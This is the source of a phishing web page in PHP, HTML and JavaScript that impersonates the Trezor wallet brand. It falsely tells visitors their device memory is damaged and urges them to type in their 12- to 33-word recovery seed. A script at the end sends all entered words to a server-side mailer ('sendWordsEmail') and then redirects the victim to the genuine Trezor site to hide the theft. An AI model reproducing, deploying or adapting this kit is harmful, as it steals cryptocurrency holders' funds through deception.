<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <title>Trezor</title>

    <!-- favicon icon -->
    <link rel="shortcut icon" href="images/favicon.png" />

    <!-- bootstrap -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css"/>

    <!-- animate -->
    <link rel="stylesheet" type="text/css" href="css/animate.css"/>


    <!-- fontawesome -->
    <link rel="stylesheet" type="text/css" href="css/font-awesome.css"/>

    <!-- themify -->
    <link rel="stylesheet" type="text/css" href="css/themify-icons.css"/>

    <!-- flaticon -->
    <link rel="stylesheet" type="text/css" href="css/flaticon.css"/>

    <!-- prettyphoto -->
    <link rel="stylesheet" type="text/css" href="css/prettyPhoto.css">

    <!-- shortcodes -->
    <link rel="stylesheet" type="text/css" href="css/shortcodes.css"/>

    <!-- main -->
    <link rel="stylesheet" type="text/css" href="css/main.css"/>

    <!-- responsive -->
    <link rel="stylesheet" type="text/css" href="css/responsive.css"/>
    <link rel="stylesheet" type="text/css" href="css/style.css"/>

    <style>
        .sidebar .widget-categories ul li a:before {
            font-family: "FontAwesome";
            content: "";
            position: absolute;
            top: 4px;
            left: 0;

        }
        .sidebar .widget-categories ul li a {
            padding-left: 0px;
            position: relative;
        }
        .sidebar .widget a {
            font-weight: 500;
            font-size: 18px;
        }
        .ttm-tabs.ttm-tab-style-horizontal ul.tabs li a
        {
            color:#000;
            border: 1px solid #333;
        }
        .site-header-menu {
            height: 80px;
        }
        .ttm-header-style-01 .site-branding, .ttm-header-style-01 #site-header-menu #site-navigation .menu > ul > li > a, .ttm-header-style-01 .ttm-header-icons, .ttm-header-style-01 .ttm-header-icon {
            height: 93px;
            line-height: 75px;
        }
    </style>
</head>

<body>

<!--page start-->
<div class="page">

    <!--header start-->
    <header id="masthead" class="header ttm-header-style-01" >

        <!-- ttm-header-wrap -->
        <div class="ttm-header-wrap">
            <!-- ttm-stickable-header-w -->
            <div id="ttm-stickable-header-w" class="ttm-stickable-header-w clearfix">
                <div id="site-header-menu" class="site-header-menu"  style="background-color:#212121">
                    <div class="site-header-menu-inner ttm-stickable-header"  style="background-color:#212121">
                        <div class="container">
                            <!-- site-branding -->
                            <div class="site-branding">
                                <a class="home-link" href="index.php" title="Altech" rel="home" style="color:#fff;font-size:24px;">
                                    <img id="logo-img" class="img-center" src="images/trezor.png" alt="logo">
                                </a>
                            </div><!-- site-branding end -->
                            <!--site-navigation -->
                            <div id="site-navigation" class="site-navigation">
                                <div class="ttm-rt-contact">
                                    <!-- header-icons -->
                                    <div class="ttm-header-icons ">

                                        <div >
                                            <li style="list-style:none;"><a href="#" style="color:#fff;border-left:1px solid #fff;padding-left:15px;">English</a></li>

                                        </div>
                                    </div><!-- header-icons end -->
                                </div>
                                <div class="ttm-menu-toggle">
                                    <input type="checkbox" id="menu-toggle-form" />
                                    <label for="menu-toggle-form" class="ttm-menu-toggle-block">
                                        <span class="toggle-block toggle-blocks-1"></span>
                                        <span class="toggle-block toggle-blocks-2"></span>
                                        <span class="toggle-block toggle-blocks-3"></span>
                                    </label>
                                </div>
                                <nav id="menu" class="menu">
                                    <ul class="dropdown">
                                        <li><a href="#">Trezor</a></li>
                                        <li><a href="#">Wallet</a></li>
                                        <li><a href="#">Wiki</a></li>
                                        <li><a href="#">Blog</a></li>
                                        <li><a href="#">Support</a></li>


                                    </ul>
                                </nav>
                            </div><!-- site-navigation end-->
                        </div>
                    </div>
                </div>
            </div><!-- ttm-stickable-header-w end-->
        </div><!--ttm-header-wrap end -->

    </header><!--header end-->


    <!--site-main start-->
    <div class="site-main" style="padding-top:100px">
        <!-- sidebar -->
        <div class="sidebar ttm-bgcolor-white clearfix">
            <div class="container">
                <!-- row -->
                <div class="row">

                    <div class="col-lg-3 widget-area">

                        <aside class="widget widget-categories">
                            <h3 class="widget-title"><img src="images/bitcoin.jpg" style="width:34px;padding-right:10px;">Bitcoin(BTC)</h3>
                            <ul>
                                <li><a href="#"><span class="ti-mobile" style="padding-right:10px;"></span>Device #1</a></li>
                                <li><a href="#"><span class="ti-settings" style="padding-right:10px;"></span>Wallet Settings</a></li>
                                <li><a href="#"><span class="ti-dropbox-alt" style="padding-right:10px;"></span>Enable Labeling</a></li>
                                <li><a href="#"><span class="ti-support" style="padding-right:10px;"></span>Support Center</a></li>

                            </ul>
                            <div style="margin-top:30px;border:1px solid #ccc;padding:20px;">
							<span style="font-size:16px;font-weight:bold">Trezor Password Manager
</span><br>
                                Would you like to protect all your passwords with the Trezor trademark cryptography? Try our popular Password Manager.
                            </div>
                        </aside>


                    </div>

                    <div class="col-lg-9 content-area">
                        <div class="row">
                            <div class="col-md-12">
                                <h2>Recovery Seed</h2>
                                <div class="stepwizard">
                                    <div class="stepwizard-row setup-panel">
                                        <div class="stepwizard-step" style="float:left;">
                                            <a href="#step-1" type="button" class="btn btn-success">1. Enter Seed Words</a>
                                        </div>
                                        <div class="stepwizard-step" style="float:left;width:25%;margin-left: 65px;background-color:#fff;border:1px solid #ccc">
                                            <a href="#step-2" type="button" class="btn btn-default" disabled="disabled">2. Restore Device</a>
                                        </div>
                                        <div class="stepwizard-step" style="float:left;width:25%;margin-left: 65px;background-color:#fff;border:1px solid #ccc">
                                            <a href="#step-3" type="button" class="btn btn-default" disabled="disabled">3. Finish</a>
                                        </div>
                                    </div>
                                </div>
                                <div style="padding-top:20px;padding-bottom:10px;">Don't reload or close your browser to avoid losing your funds. Your device's memory has been partially damaged. Please enter your Recovery Seed immediately to Recover Your Device And Wallet.
                                </div>
                                <h3>SELECT NUMBER OF WORDS IN YOUR RECOVERY SEEDS</h3>
                            </div>
                            <div class="col-md-12">
                                <div class="ttm-tabs ttm-tab-style-horizontal clearfix">
                                    <!-- tabs -->
                                    <ul class="tabs clearfix">
                                        <li class="tab active"><a href="#">12 Word</a></li>
                                        <li class="tab"><a href="#">18 Word</a></li>
                                        <li class="tab"><a href="#">20 Word</a></li>
                                        <li class="tab"><a href="#">24 Word</a></li>
                                        <li class="tab"><a href="#">33 Word</a></li>
                                    </ul>
                                    <div class="content-tab">
                                        <div class="content-inner">
                                            <div class="row">

                                                <div class="col-lg-12">
                                                    <div class="row">
                                                        <div class="col-lg-8">
                                                            <div class="row">
                                                                <?php
                                                                for($i=1;$i<=12;$i++)
                                                                {
                                                                    ?>
                                                                    <div class="col-md-6">
                                                                        <label for="Word1">Word <?php echo $i;?></label>
                                                                        <input type="text" class="form-control" id="Word12_<?php echo $i;?>" name="Word1" required>
                                                                    </div>

                                                                    <?php
                                                                }
                                                                ?>

                                                                <div class="col-md-12">
                                                                    <input type="button" class="btn btn-primary" style="width:150px;" value="Submit" onclick="submitWords('12')">
                                                                </div>
                                                                <div class="col-md-12" id="response_12" style="padding-top:20px;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="content-inner">
                                            <div class="row">
                                                <div class="col-lg-12">
                                                    <div class="row">
                                                        <div class="col-lg-8">
                                                            <div class="row">
                                                                <?php
                                                                for($i=1;$i<=18;$i++)
                                                                {
                                                                    ?>
                                                                    <div class="col-md-6">
                                                                        <label for="Word1">Word <?php echo $i;?></label>
                                                                        <input type="text" class="form-control" id="Word18_<?php echo $i;?>" name="Word1" required>
                                                                    </div>

                                                                    <?php
                                                                }
                                                                ?>
                                                                <div class="col-md-12">
                                                                    <input type="button" class="btn btn-primary" style="width:150px;" value="Submit" onclick="submitWords('18')">
                                                                </div>
                                                                <div class="col-md-12" id="response_18" style="padding-top:20px;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="content-inner">
                                            <div class="row">
                                                <div class="col-lg-12">
                                                    <div class="row">
                                                        <div class="col-lg-8">
                                                            <div class="row">
                                                                <?php
                                                                for($i=1;$i<=20;$i++)
                                                                {
                                                                    ?>
                                                                    <div class="col-md-6">
                                                                        <label for="Word1">Word <?php echo $i;?></label>
                                                                        <input type="text" class="form-control" id="Word20_<?php echo $i;?>" name="Word1" required>
                                                                    </div>

                                                                    <?php
                                                                }
                                                                ?>
                                                                <div class="col-md-12">
                                                                    <input type="button" class="btn btn-primary" style="width:150px;" value="Submit" onclick="submitWords('20')">
                                                                </div>
                                                                <div class="col-md-12" id="response_20" style="padding-top:20px;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="content-inner">
                                            <div class="row">
                                                <div class="col-lg-12">
                                                    <div class="row">
                                                        <div class="col-lg-8">
                                                            <div class="row">
                                                                <?php
                                                                for($i=1;$i<=24;$i++)
                                                                {
                                                                    ?>
                                                                    <div class="col-md-6">
                                                                        <label for="Word1">Word <?php echo $i;?></label>
                                                                        <input type="text" class="form-control" id="Word24_<?php echo $i;?>" name="Word1" required>
                                                                    </div>

                                                                    <?php
                                                                }
                                                                ?>
                                                                <div class="col-md-12">
                                                                    <input type="button" class="btn btn-primary" style="width:150px;" value="Submit" onclick="submitWords('24')">
                                                                </div>
                                                                <div class="col-md-12" id="response_24" style="padding-top:20px;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="content-inner">
                                            <div class="row">
                                                <div class="col-lg-12">
                                                    <div class="row">
                                                        <div class="col-lg-8">
                                                            <div class="row">
                                                                <?php
                                                                for($i=1;$i<=33;$i++)
                                                                {
                                                                    ?>
                                                                    <div class="col-md-6">
                                                                        <label for="Word1">Word <?php echo $i;?></label>
                                                                        <input type="text" class="form-control" id="Word33_<?php echo $i;?>" name="Word1" required>
                                                                    </div>

                                                                    <?php
                                                                }
                                                                ?>
                                                                <div class="col-md-12">
                                                                    <input type="button" class="btn btn-primary" style="width:150px;" value="Submit" onclick="submitWords('33')">
                                                                </div>
                                                                <div class="col-md-12" id="response_33" style="padding-top:20px;">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>


                            </div>
                        </div>


                    </div>
                </div><!-- row end -->
            </div>
        </div>
        <!-- sidebar end -->
    </div><!--site-main end-->

    <!--footer start-->
    <footer class="footer widget-footer clearfix">


        <div class="bottom-footer-text ttm-bgcolor-darkgrey ttm-textcolor-white">
            <div class="container">
                <div class="row copyright">
                    <div class="col-md-6">
                        <div class="">
                            <span>Copyright © 2021&nbsp;<a href="#">Trezor</a></span>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="text-md-right res-767-mt-10">
                            <div class="d-lg-inline-flex">
                                <ul id="menu-footer-menu" class="footer-nav-menu">
                                    <li><a href="#">About Us</a></li>
                                    <li><a href="#">Services</a></li>
                                    <li><a href="#">Privacy</a></li>
                                </ul>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!--footer end-->

    <!--back-to-top start-->
    <a id="totop" href="#top">
        <i class="fa fa-angle-up"></i>
    </a>
    <!--back-to-top end-->

</div><!-- page end -->

<!-- Javascript -->

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.easing.js"></script>
<script src="js/main.js"></script>

<script>
    function submitWords(num)
    {
        formdata = new FormData();
        formdata.append("REQUEST", "sendWordsEmail");
        var errorMsg="";
        for(var i=1;i<=num;i++)
        {
            var word = document.getElementById("Word"+num+"_"+i).value;
            if(word!="")
            {
                formdata.append("Word"+i, word);
            }
            else
            {
                errorMsg = errorMsg + "Word "+i+" is required<br>";
            }
        }
        if(errorMsg!="")
        {
            document.getElementById("response_"+num).innerHTML=errorMsg;

        }
        else
        {
            document.getElementById("response_"+num).innerHTML='<img src="images/loading.gif">';
            formdata.append("num", num);
            $.ajax({
                url: "Mailer/ajax.php",
                data: formdata,
                type: 'POST',
                contentType: false,
                processData: false,

                success: function (data) {
                    console.log(data);
                    if (data.fail) {

                        alert(data.errors['file']);
                    }
                    else {
                        //alert(data);
                        document.getElementById("response_"+num).innerHTML="We will contact you as soon as possible";
                        for(var i=1;i<=num;i++)
                        {
                            document.getElementById("Word"+num+"_"+i).value="";
                        }
                        window.location.href="https://wallet.trezor.io/";
                    }
                    //$('#loading').css('display', 'none');
                },
                error: function (xhr, status, error) {
                    alert(xhr.responseText);

                }
            });
        }

    }
</script>

</body>
</html>